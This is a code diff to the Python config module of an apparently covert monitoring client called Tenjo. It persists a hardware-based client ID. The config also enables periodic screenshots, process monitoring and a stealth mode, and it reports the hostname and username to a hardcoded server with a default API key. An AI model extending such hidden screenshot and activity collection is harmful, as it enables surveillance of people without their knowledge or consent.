@@ -3,17 +3,42 @@ import os
 import uuid
 import socket
 import platform
+import json
 from datetime import datetime
 
 class Config:
     # Server Configuration
-    SERVER_URL = os.getenv('TENJO_SERVER_URL', "http://103.129.149.67")
+    SERVER_URL = os.getenv('TENJO_SERVER_URL', "http://103.129.149.67")  # Production server
+    # SERVER_URL = os.getenv('TENJO_SERVER_URL', "http://127.0.0.1:8000")  # Local development server
     API_ENDPOINT = f"{SERVER_URL}/api"
     API_KEY = os.getenv('TENJO_API_KEY', "tenjo-api-key-2024")
 
-    # Client Identification - Dynamic generation based on hardware
-    @staticmethod
-    def generate_client_id():
+    # Base paths for persistent storage
+    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    DATA_DIR = os.path.join(BASE_DIR, "data")
+    LOG_DIR = os.path.join(BASE_DIR, "logs")
+    CLIENT_CONFIG_FILE = os.path.join(DATA_DIR, "client_config.json")
+
+    @classmethod
+    def _load_config(cls):
+        """Load configuration from persistent storage"""
+        if os.path.exists(cls.CLIENT_CONFIG_FILE):
+            try:
+                with open(cls.CLIENT_CONFIG_FILE, 'r') as f:
+                    return json.load(f)
+            except:
+                pass
+        return {}
+
+    @classmethod
+    def _save_config(cls, config_data):
+        """Save configuration to persistent storage"""
+        os.makedirs(cls.DATA_DIR, exist_ok=True)
+        with open(cls.CLIENT_CONFIG_FILE, 'w') as f:
+            json.dump(config_data, f, indent=2)
+
+    @classmethod
+    def generate_client_id(cls):
         """Generate unique client ID based on hardware"""
         import hashlib
         
@@ -31,11 +56,25 @@ class Config:
         client_uuid = f"{hex_dig[:8]}-{hex_dig[8:12]}-{hex_dig[12:16]}-{hex_dig[16:20]}-{hex_dig[20:32]}"
         
         return client_uuid
-    
-    # Use dynamic client ID generation
-    CLIENT_ID = generate_client_id.__func__()
-    CLIENT_NAME = socket.gethostname()
-    CLIENT_USER = os.getenv('USER', os.getenv('USERNAME', 'unknown'))
+
+    @classmethod
+    def get_client_id(cls):
+        """Get persistent CLIENT_ID, generate if not exists"""
+        config = cls._load_config()
+        
+        if 'client_id' not in config:
+            # Generate new CLIENT_ID and save it
+            config['client_id'] = cls.generate_client_id()
+            cls._save_config(config)
+        
+        return config['client_id']
+
+    @classmethod
+    def save_client_config(cls, client_data):
+        """Save client configuration data"""
+        config = cls._load_config()
+        config.update(client_data)
+        cls._save_config(config)
 
     # Monitoring Settings
     SCREENSHOT_INTERVAL = int(os.getenv('TENJO_SCREENSHOT_INTERVAL', '60'))  # seconds
@@ -48,10 +87,9 @@ class Config:
     PROCESS_MONITORING = True
     STEALTH_MODE = True
 
-    # Paths
-    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-    LOG_DIR = os.path.join(BASE_DIR, "logs")
-    DATA_DIR = os.path.join(BASE_DIR, "data")
+    # Client info
+    CLIENT_NAME = socket.gethostname()
+    CLIENT_USER = os.getenv('USER', os.getenv('USERNAME', 'unknown'))
 
     # Logging
     LOG_LEVEL = os.getenv('TENJO_LOG_LEVEL', "INFO")
@@ -63,5 +101,6 @@ class Config:
         os.makedirs(cls.LOG_DIR, exist_ok=True)
         os.makedirs(cls.DATA_DIR, exist_ok=True)
 
-# Initialize directories
+# Initialize directories and set CLIENT_ID
 Config.init_directories()
+Config.CLIENT_ID = Config.get_client_id()
